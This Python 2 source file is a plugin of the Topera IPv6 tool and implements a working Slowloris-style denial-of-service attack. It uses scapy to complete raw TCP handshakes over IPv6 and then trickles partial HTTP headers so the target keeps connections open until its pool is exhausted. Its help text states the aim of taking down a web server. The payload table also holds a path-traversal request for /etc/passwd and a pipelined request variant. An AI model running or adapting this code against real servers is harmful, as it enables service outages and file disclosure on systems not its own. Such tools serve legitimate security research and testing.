#!/usr/bin/python
# -*- coding: utf-8 -*-

__license__ = '''
Topera - IPv6 Analysis tool

Copyright (C) 2011-2012  Daniel Garcia a.k.a cr0hn (@ggdaniel) | cr0hn<@>cr0hn.com
Copyright (C) 2011-2012  Rafael Sanchez (@r_a_ff_a_e_ll_o) | rafa<@>iniqua.com

Project page: https://github.com/toperaproject/topera/

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
'''


# Delete warning messages for scapy
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# System imports
from sys import stdout, exit
from random import randint
from time import sleep
import multiprocessing

try:
	from scapy.all import sniff, IPv6, IPv6ExtHdrDestOpt, TCP, Ether, ATMT, conf, neighsol, ICMPv6ND_NA
except ImportError:
	print ""
	print "[!] You need to install scapy libs."
	print ""
	print "To install it, run:"
	print "   apt-get install python-scapy"
	print ""
	exit(1)

# Topera imports
from topera.common import cmdParams, setup_firewall
from topera.plugins.plugins import ToperaPlugin
from topera.payloader import make_payload
from topera.iodebug import *

#------------------------------------------------------------------------------
#
# PLUGIN VARS
#
#------------------------------------------------------------------------------
PAYLOADS = {
    'data1'   : "GET / HTTP/1.1\r\nHost: modsecurity\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nIf-Modified-Since: Tue, 10 May 2011 07:45:00 GMT\r\nCache-Control: max-age=0\n",
    'data2'   : "\r\n\r\n\r\n\r\n\r\n\r\nGET /inseguro.php?archivo_secreto=/etc/passwd HTTP/1.1\r\nHost: [2003:444:666::3]\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\n\r\n",
    'data3'   : "GET / HTTP/1.1\r\nHost: modsecurity\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nIf-Modified-Since: Tue, 10 May 2011 07:45:00 GMT\r\nCache-Control: max-age=0\r\n\r\nGET /inseguro.php?archivo_secreto=/etc/passwd HTTP/1.1\r\nHost: [2003:444:666::3]\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\n\r\n",
    'payload1': "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nIf-Modified-Since: Tue, 10 May 2011 07:45:00 GMT\r\nCache-Control: max-age=0\n",
    'payload2': "Accept-Language: en-us,en;q=0.5\n",
    'payload3': "X-a: b\n",
    'payload4': "TE: deflate\n"
}


#------------------------------------------------------------------------------
class ToperaLoris(multiprocessing.Process):
	""""""

	#----------------------------------------------------------------------
	def __init__(self, target, partial_header, session_numbers, send_function, delay = 0.05, output_iface = "eth0", dport = 80, connection_number = 100, debuging = 0):
		"""Constructor"""
		super(ToperaLoris, self).__init__()

		self.__TARGET               = target
		self.__DPORT                = dport
		self.__DEBUG                = debuging
		self.__CONNECTIONS          = connection_number
		self.__OUTIFACE             = output_iface
		self.__DELAY                = delay
		self.__partial_header       = partial_header
		self.__SEND_FUNC            = send_function

		#
		# For controling the correspondence of SEQ <-> ACK
		#
		# {'sport': { 'ack': int, 'dport': int, 'seq': int}
		self.__SESSION_NUMBERS      = session_numbers

		# {'sport': seq_num }
		self.__SESSION_NUMBERS_3WAY = multiprocessing.Manager().dict()

		# Used ports
		self.__USED_PORTS           = multiprocessing.Manager().list()

		# Active connections
		self.__ACTIVE_CONNECTIONS   = 0

		#
		# Config firewall
		#
		setup_firewall(self.__TARGET, self.__DEBUG)


	#----------------------------------------------------------------------
	def send_syn(self):
		"""Send all TCP SYN"""

		while self.__CONNECTIONS >= self.__ACTIVE_CONNECTIONS:
			# Common config
			m_SPORT      = randint(1025,65534)
			# Check if port are not already used
			while m_SPORT in self.__USED_PORTS:
				m_SPORT  = randint(1025,65534)
			# Store the port
			self.__USED_PORTS.append(m_SPORT)

			m_seq        = randint(11111,99999)

			IODebug.displayMoreDebugInfo("\nDEBUG 3: SYN send in thread: '%s'" % str(self.ident))

			# Store info
			self.__SESSION_NUMBERS_3WAY[m_SPORT] = m_seq

			sleep(self.__DELAY)

			#
			# Making 3 way handshake
			#
			#sendp(self.__partial_header/TCP(sport=m_SPORT, dport=int(self.__DPORT), flags="S", seq=m_seq), verbose=0, iface=self.__OUTIFACE)
			self.__SEND_FUNC(self.__partial_header/TCP(sport=m_SPORT, dport=int(self.__DPORT), flags="S", seq=m_seq), verbose=0, iface=self.__OUTIFACE)

			# Increasing active connections
			self.__ACTIVE_CONNECTIONS += 1

	#----------------------------------------------------------------------
	def run(self):
		"""Run the attack"""
		# Run sniffer to receive ack
		m_filter = "tcp and src host %s and ip6" % (str(self.__TARGET))
		sniff(filter = m_filter, prn = self.received_package, store=0) #, var_stop=self.__stop)

	#----------------------------------------------------------------------
	def received_package(self, pkt):
		"""Function to process packages received."""

		if "TCP" not in pkt or "IPv6" not in pkt or pkt[IPv6].src != self.__TARGET:
			return

		m_sport      = pkt[TCP].dport
		m_dport      = pkt[TCP].sport

		# If SYN+ACK is received
		if pkt["TCP"].flags == 18L: # SYN + ACK
			if pkt["TCP"].dport not in self.__SESSION_NUMBERS_3WAY:
				return

			# Get info
			m_stored_seq = self.__SESSION_NUMBERS_3WAY.pop(m_sport) # Remove from list

			# Server ISN <---> Client ISN
			m_ACK_3WAY   = pkt[TCP].seq
			m_ACK        = m_ACK_3WAY + 1
			m_CURR_SEQ   = m_stored_seq + 1

			# Send ACK to complete 3 way handshake
			#sendp(self.__partial_header/TCP(sport=m_sport, dport=m_dport, flags="A", seq=m_CURR_SEQ,ack=m_ACK), verbose=0, iface=self.__OUTIFACE)
			self.__SEND_FUNC(self.__partial_header/TCP(sport=m_sport, dport=m_dport, flags="A", seq=m_CURR_SEQ,ack=m_ACK), verbose=0, iface=self.__OUTIFACE)

			# Customize the packet for FIRST PUSH
			m_PUSH = self.__partial_header/TCP(sport=m_sport, dport=m_dport, flags="PA", seq=m_CURR_SEQ,ack=m_ACK)

			#
			# Send the first packet synchronized with the SEQ number
			#
			# Select the payload
			m_PAYLOAD = PAYLOADS['data1']

			# Send
			#sendp(m_PUSH/m_PAYLOAD, verbose=0, iface=self.__OUTIFACE)
			self.__SEND_FUNC(m_PUSH/m_PAYLOAD, verbose=0, iface=self.__OUTIFACE)

			# Update seq and ack numbers
			self.__SESSION_NUMBERS[m_sport] = { 'dport': m_dport, 'seq': m_CURR_SEQ, 'ack': m_ACK}

		elif pkt["TCP"].flags == 17L or pkt["TCP"].flags == 4L or pkt["TCP"].flags == 20L: # FIN + ACK || RST || RST + ACK
			# Delete the connection
			self.__ACTIVE_CONNECTIONS -= 1

			if m_sport in self.__USED_PORTS:
				self.__USED_PORTS.remove(m_sport)

			IODebug.displayDebugInfo("\nDEBUG 1: Reset detected. Making new connections")

			# Start new connection
			self.send_syn()

		elif pkt["TCP"].flags == 20L: # RST + ACK
			IODebug.displayInfo("Connection to port '%s' refused!" % str(m_sport))

#----------------------------------------------------------------------
def send_push(PARTIAL_HEADER, session_numbers, payload, send_function, output_iface="eth0"):
	""""""

	SESSION_NUMBERS = session_numbers
	SEND_FUNCTION   = send_function

	#
	# Start the massive attack
	#
	try:
		while 1:
			try:
				tmp_data  = SESSION_NUMBERS.popitem()

				m_sport   = tmp_data[0]
				data      = tmp_data[1]

				#m_sport   = data['sport']
				m_ack     = data['ack']
				m_dport   = data['dport']
				m_seq     = data['seq']

				m_PAYLOAD = payload

				# Customize the packet
				m_seq  += len(m_PAYLOAD)
				m_PUSH = PARTIAL_HEADER/TCP(sport=m_sport, dport=m_dport, flags="PA", seq=m_seq,ack=m_ack)

				# Send
				#sendp(m_PUSH/m_PAYLOAD, verbose=0, iface=output_iface)
				SEND_FUNCTION(m_PUSH/m_PAYLOAD, verbose=0, iface=output_iface)

				# Print log
				IODebug.displayInfo(".", carry=False)

				sleep(0.05)

				# Update seq number
				SESSION_NUMBERS[m_sport] = {'sport': m_sport, 'dport': m_dport, 'seq': m_seq, 'ack': m_ack}

			except KeyError,e:
				sleep(0.05)
				continue

	except KeyboardInterrupt:
		return






class ToperaLorisPlugin(ToperaPlugin):

	#----------------------------------------------------------------------
	def get_parser(self, main_parser):
		if not main_parser:
			raise ValueError("Main parser can't be null")
		grmode = main_parser.add_argument_group("Topera loris options")
		grmode.add_argument('--max-connection', action='store', dest='max_connection', help='maximun number of connections', default = 300)
		grmode.add_argument('--dport', action='store', dest='dest_port', help='destination port. Default 80.', default = 80)
		grmode.add_argument('--delay', action='store', dest='delay', help='delay between each send of packet. Default 50ms.', default = 0.05, type=float)

	#----------------------------------------------------------------------
	def run(self, plugin_Params, global_params):
		"""Get the help message for this plugin."""

		#----------------------------------------------------------------------
		# Packet layers
		TARGET            = global_params.target
		DST_MAC           = global_params.mac_dst
		DST_PORT          = int(plugin_Params.dest_port)
		CONN_NUM          = int(plugin_Params.max_connection)
		OUT_IFACE         = global_params.iface_out
		PAYLOAD           = PAYLOADS['payload3']
		SEND_FUNCTION     = global_params.send_function

		eth_header        = Ether(dst=DST_MAC)
		ip_header         = IPv6(dst=TARGET)
		# Add headers
		ip_payload        = make_payload(num_headers=global_params.headers_num, ext_type=global_params.payload_type)

		# Partial payload
		partial_payload   = None

		# Set communication level: 2 or 3.
		if global_params.level == 2:
			partial_payload = eth_header/ip_header
		else:
			partial_payload = ip_header

		# iS payload selected?
		if ip_payload:
			PARTIAL_HEADER    = partial_payload/ip_payload
		else:
			PARTIAL_HEADER    = partial_payload


		#
		# Shared data
		#
		# For controling the correspondence of SEQ <-> ACK
		#
		# {'sport': { 'ack': int, 'dport': int, 'seq': int}
		SESSION_NUMBERS      = multiprocessing.Manager().dict()

		# Processes
		dispatch          = multiprocessing.Process(target = send_push,
		                                            args   = (PARTIAL_HEADER, SESSION_NUMBERS, PAYLOAD, SEND_FUNCTION, OUT_IFACE))

		topera            = ToperaLoris(TARGET,
		                                dport             = DST_PORT,
		                                partial_header    = PARTIAL_HEADER,
		                                session_numbers   = SESSION_NUMBERS,
		                                output_iface      = OUT_IFACE,
		                                send_function     = SEND_FUNCTION,
		                                delay             = plugin_Params.delay,
		                                debuging          = global_params.verbosity,
		                                connection_number = CONN_NUM)
		try:
			dispatch.start()
			topera.start()

			# Launch all syn packets
			topera.send_syn()

			# Wait for topera and dispatcher
			topera.join()
			dispatch.join()


		except KeyboardInterrupt:
			IODebug.displayInfo("\nStoping, please be patient...\n")
			try:
				dispatch.terminate()
				topera.terminate()
			except Exception:
				pass
			IODebug.displayInfo("\n")

	#----------------------------------------------------------------------
	def display_help(self):
		"""Display help for this plugin."""
		return """
Slow HTTP attack allows a single machine to take down another machine's web server with minimal bandwidth and side effects on unrelated services and ports.

As a Slowloris does, TOPERA loris tries to keep many connections to the target web server open and hold them open as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request. Periodically, it will send subsequent HTTP headers, adding to—but never completing—the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, eventually denying additional connection attempts from clients"""
